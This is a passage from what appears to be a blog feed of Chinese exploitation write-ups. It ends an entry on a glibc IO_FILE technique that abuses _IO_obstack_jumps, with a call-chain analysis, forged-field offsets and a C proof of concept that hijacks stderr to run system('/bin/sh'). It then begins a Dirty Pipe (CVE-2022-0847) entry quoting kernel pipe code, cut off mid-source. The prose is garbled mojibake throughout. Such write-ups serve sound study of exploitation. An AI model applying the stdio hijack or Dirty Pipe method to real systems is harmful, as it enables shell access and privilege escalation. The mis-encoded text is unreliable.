class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">_IO_obstack_xsputn (FILE *fp, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((struct _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need some more memory.  First shrink the buffer to the</span></span><br><span class="line"><span class="comment"> space we really currently need.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now grow for N bytes, and put the data there.  */</span></span><br><span class="line">      obstack_grow (obstack, data, n);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">      fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">      size = obstack_room (obstack);</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">      <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬çš„ç›®æ ‡æ—¶è°ƒç”¨åˆ°<code>obstack_grow</code>å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›å…¥è¿™ä¸ªifè¯­å¥ï¼Œè¿™ä¸€ç‚¹å¾ˆå¥½è¯´ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿™ä¸ªç»“æ„ä½“å°±å¯ä»¥éå¸¸è½»æ¾çš„æ§åˆ¶è¿™é‡Œçš„å€¼è€Œåè¿›å…¥ifè¯­å¥ï¼Œéšååˆä¼šæ‰§è¡Œ<code>obstack_blank_fast</code>å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define obstack_blank_fast(h, n) ((h)-&gt;next_free += (n))</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå…¶å®æ˜¯ä¸€ä¸ªå®å®šä¹‰ï¼Œå¯ä»¥çœ‹åˆ°å†…éƒ¨å…¶å®ä¸ä¼šç‰¹åˆ«å½±å“åç»­çš„å†…å®¹ã€‚åœ¨ç»§ç»­æ‰§è¡Œå°±ä¼šè¿›å…¥æˆ‘ä»¬æœŸæœ›çš„å‡½æ•°:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> obstack_grow(OBSTACK, where, length)                      \</span></span><br><span class="line"><span class="meta">  __extension__                                   \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);                       \</span></span><br><span class="line"><span class="meta">       int __len = (length);                              \</span></span><br><span class="line"><span class="meta">       <span class="meta-keyword">if</span> (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \</span></span><br><span class="line"><span class="meta">     _obstack_newchunk (__o, __len);                      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);                     \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;                           \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªä¹Ÿæ˜¯ä¸€ä¸ªå®å®šä¹‰ï¼ŒåŒæ ·çš„æˆ‘ä»¬åˆå¿…é¡»é€šè¿‡<code>_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit</code>è¿™æ¡ifè¯­å¥æ‰èƒ½è°ƒç”¨åˆ°<code>_obstack_newchunk</code>å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">  _obstack_newchunk (struct obstack *h, <span class="keyword">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="keyword">long</span> new_size;</span><br><span class="line">  <span class="keyword">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">long</span> already;</span><br><span class="line">  <span class="keyword">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  <span class="keyword">if</span> (!new_chunk)</span><br><span class="line">    (*obstack_alloc_failed_handler)();</span><br><span class="line">  h-&gt;chunk = new_chunk;</span><br><span class="line">  new_chunk-&gt;prev = old_chunk;</span><br><span class="line">  new_chunk-&gt;limit = h-&gt;chunk_limit = (<span class="keyword">char</span> *) new_chunk + new_size;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯ä»¥ç›´æ¥è°ƒç”¨åˆ°æˆ‘ä»¬æœŸæœ›çš„å®å®šä¹‰<code>CALL_CHUNKFUN</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨ç›´æ¥æ‹¿æŒ‡é’ˆå½“ä½œå‡½æ•°çš„æ“ä½œ<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code>ï¼Œæ¡ä»¶ä¹Ÿå°±æ˜¯<code>(((h)-&gt;use_extra_arg)</code>ä¸ä¸º0ï¼›</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ‰€ä»¥ä»ä¸Šåˆ°ä¸‹çš„è°ƒç”¨é“¾ä¹Ÿæ˜¯å¯ä»¥ç›´æ¥å†™å‡ºæ¥äº†:</p><p><code>_IO_obstack_xsputn</code>=&gt;<code>obstack_grow</code>=&gt;<code>_obstack_newchunk</code>=&gt;<code>CALL_CHUNKFUN</code>=&gt;<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code></p><p>æœ€åå†æ ¹æ®ç»“æ„ä½“å±æ€§çš„åç§»å†™ä¸Šä¸Šè¿°çº¦æŸçš„å€¼å³å¯ã€‚</p><p>å½“<code>_IO_list_all</code>æŒ‡å‘æˆ‘ä»¬å¯æ§Aåœ°å€æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å¯¹Aåœ°å€å†™å…¥å¦‚ä¸‹æ•°æ®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A + <span class="number">0x18</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0x20</span> = <span class="number">0</span>;</span><br><span class="line">A + <span class="number">0x28</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0x30</span> = <span class="number">0</span>;</span><br><span class="line">A + <span class="number">0x38</span> = system_addr;</span><br><span class="line">A + <span class="number">0x48</span> = bin_sh_addr;</span><br><span class="line">A + <span class="number">0x50</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0xd8</span> = _IO_obstack_jumps+<span class="number">0x20</span>;</span><br><span class="line">A + <span class="number">0xe0</span> = A;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221201134245450.png"                      alt="image-20221201134245450"                ></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> bin_sh_addr[<span class="number">0x10</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> libc_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> printf_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *IO_2_1_stderr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> IO_obstack_jumps;</span><br><span class="line"><span class="built_in">strcpy</span>(bin_sh_addr,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;start!\n&quot;</span>);</span><br><span class="line">printf_addr = <span class="built_in">printf</span>;</span><br><span class="line">libc_base = printf_addr - <span class="number">0x55700</span>;</span><br><span class="line"></span><br><span class="line">IO_2_1_stderr = libc_base + <span class="number">0x1f7680</span>;</span><br><span class="line">IO_obstack_jumps = libc_base + <span class="number">0x1f33a0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x28</span>/<span class="number">8</span>)) = <span class="number">0x1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x30</span>/<span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x18</span>/<span class="number">8</span>)) = <span class="number">1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x20</span>/<span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x50</span>/<span class="number">8</span>)) = <span class="number">1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0xd8</span>/<span class="number">8</span>)) = IO_obstack_jumps+<span class="number">0x20</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0xe0</span>/<span class="number">8</span>)) = IO_2_1_stderr;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x38</span>/<span class="number">8</span>)) = system;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x48</span>/<span class="number">8</span>)) = bin_sh_addr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šlibcå‡ä½¿ç”¨:<code>Ubuntu GLIBC 2.36-0ubuntu4</code></p><hr><p>å‚è€ƒæ–‡ç« </p><p><a class="link"   href="https://tttang.com/archive/1845/#toc" >https://tttang.com/archive/1845/#toc<i class="fas fa-external-link-alt"></i></a>_</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿‘æœŸåˆå‡ºç°ä¸€ä¸ªæ–°çš„å…³äº&lt;code&gt;IO_FILE&lt;/code&gt;çš„åˆ©ç”¨æ–¹å¼ï¼Œä¸è¿‡åŸä½œè€…å¹¶æ²¡æœ‰å‡ºåå­—ä½†æ˜¯æˆ‘blogåˆæ˜¯ç”¨house ofç³»åˆ—åˆ†ç±»çš„æ‰€ä»¥å°±å…ˆéšä¾¿å–ä¸ªåå­—ã€‚&lt;/p&gt;
&lt;h2 id=&quot;åŸç†åˆ†æ&quot;&gt;&lt;a href=&quot;#åŸç†åˆ†æ&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of ç³»åˆ—" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-0847 Dirty Pipe</title>
    <link href="https://cv196082.gitee.io/2022/11/22/CVE-2022-0847-Dirty-Pipe/"/>
    <id>https://cv196082.gitee.io/2022/11/22/CVE-2022-0847-Dirty-Pipe/</id>
    <published>2022-11-22T12:54:31.000Z</published>
    <updated>2022-11-22T12:54:02.950Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æŒç»­æ€§æ‘†çƒ‚ä¸€æ®µæ—¶é—´äº†ï¼Œåˆæƒ³çœ‹jyyçš„è¯¾ï¼Œåˆè¦æœŸæœ«è€ƒè¯•äº†ï¼Œå¥½çƒ¦ï¼ç´¢æ€§èŠ±ç‚¹æ—¶é—´æŠŠGyanç¥ä¸ŠåŠå¹´å«æˆ‘å¤ç°çš„CVEå¤ç°äº†ã€‚</p><p>è¿™ä¸ªCVEå…è®¸å‘ä»»æ„å¯è¯»æ–‡ä»¶ä¸­å†™æ•°æ®ï¼Œå¯é€ æˆéç‰¹æƒè¿›ç¨‹å‘rootè¿›ç¨‹æ³¨å…¥ä»£ç ã€‚è¯¥æ¼æ´å‘ç”Ÿlinuxå†…æ ¸ç©ºé—´é€šè¿‡spliceæ–¹å¼å®ç°æ•°æ®æ‹·è´æ—¶ï¼Œä»¥â€é›¶æ‹·è´â€çš„å½¢å¼å°†æ–‡ä»¶å‘é€åˆ°pipeï¼Œå¹¶ä¸”æ²¡æœ‰åˆå§‹åŒ–pipeç¼“å­˜é¡µç®¡ç†æ•°æ®ç»“æ„çš„flagæˆå‘˜ã€‚</p><h2 id="é›¶æ‹·è´"><a href="#é›¶æ‹·è´" class="headerlink" title="é›¶æ‹·è´"></a>é›¶æ‹·è´</h2><p>é¦–å…ˆéœ€è¦äº†è§£ä¸€ä¸‹é›¶æ‹·è´çš„æ¦‚å¿µï¼Œåœ¨æ™®é€šçš„æ–‡ä»¶ä¼ è¾“è¿‡ç¨‹æ˜¯å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œè¿›è¡Œäº†å››æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå¯¼è‡´ä¸å¿…è¦çš„æµªè´¹å’Œå¼€é”€</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/f31ece783dd86621734188fa2d58b4bb.png"                                     ></p><p>æ‰€ä»¥linuxå†…æ ¸å‡ºç°äº†è§£å†³åŠæ³•å°±æ˜¯å¯ä»¥å¿«é€Ÿé«˜æ•ˆåœ°å°†æ•°æ®ä»æ–‡ä»¶ç³»ç»Ÿç§»åŠ¨åˆ°ç½‘ç»œæ¥å£ï¼Œè€Œä¸éœ€è¦å°†å…¶ä»å†…æ ¸ç©ºé—´å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼Œè€Œè¿™ä¹Ÿå°±æ˜¯æ‰€è°“çš„é›¶æ‹·è´ï¼Œåœ¨linuxå†…æ ¸ä¸­æœ‰spliceæ–¹å¼æ¥è§£å†³ã€‚</p><p>è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ä¸ä»…æ”¯æŒç½‘ç»œå±‚é¢çš„ä¼ è¾“ï¼Œå¦‚æœç”¨æˆ·æ‹¥æœ‰ä¸¤ä¸ªå·²ç»æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦å¯ä»¥ä»»æ„æ–‡ä»¶ç›¸äº’è¿æ¥ï¼Œè€Œä¸ä»…é™äºsocketã€‚</p><h2 id="pipeåŸç†"><a href="#pipeåŸç†" class="headerlink" title="pipeåŸç†"></a>pipeåŸç†</h2><p>pipeåœ¨å‰é¢çš„åˆ©ç”¨ä¸­ä¹Ÿä½¿ç”¨åˆ°è¿‡ï¼Œä¸è¿‡å¤§å¤šæ˜¯åˆ©ç”¨å®ƒç”³è¯·çš„ç»“æ„ä½“çš„å †å—åŠ«æŒopsæˆ–è€…æ³„æ¼ï¼Œè¿™é‡Œä¸»è¦æ˜¯ä½¿ç”¨ä»–åˆå§‹åŒ–ä¼šå¸¦æ¥çš„å†…å®¹ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬æ¸…æ¥špipeä¼šåˆ›å»ºä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œä¸€ä¸ªæ˜¯è¾“å…¥å¦ä¸€ä¸ªè¾“å‡ºã€‚åœ¨å†…æ ¸ä¸­pipeç¼“å†²åŒºçš„æ€»é•¿åº¦æ˜¯65536å­—èŠ‚ï¼Œä¸€å…±16é¡µï¼Œè¿™é‡Œé¡µä¸é¡µä¹‹é—´ä¸è¿ç»­æ˜¯é€šè¿‡æ•°ç»„è¿›è¡Œç®¡ç†çš„ï¼Œç»´æŠ¤çš„æ˜¯ä¸€ä¸ªç±»ä¼¼äºé“¾è¡¨çš„ç»“æ„ã€‚ä»¥å‰å°±æåˆ°è¿‡ï¼Œpipeåœ¨å†…æ ¸ä¸­æ˜¯ä¸‹å›¾è¿™æ ·çš„è¡¨ç°å½¢å¼ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/640.jpeg"                                     ></p><p>æœ‰pipe_bufferç»“æ„ä½“åªæƒ³pageï¼Œè€Œpipe_bufferç»“æ„ä½“åœ¨å¾€æœŸkernelä¸­æœ‰è¯¦ç»†ä»‹ç»ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line"><span class="keyword">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line"><span class="keyword">ssize_t</span> chars;</span><br><span class="line"><span class="keyword">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null write succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">ret = -EXDEV;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Only wake up if the pipe started out empty, since</span></span><br><span class="line"><span class="comment"> * otherwise there should be no readers waiting.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If it wasn&#x27;t empty we try to merge new data into</span></span><br><span class="line"><span class="comment"> * the last buffer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * That naturally merges small writes, but it also</span></span><br><span class="line"><span class="comment"> * page-aligs the rest of the writes for large writes</span></span><br><span class="line"><span class="comment"> * spanning multiple pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line"><span class="keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf-&gt;len += ret;</span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span 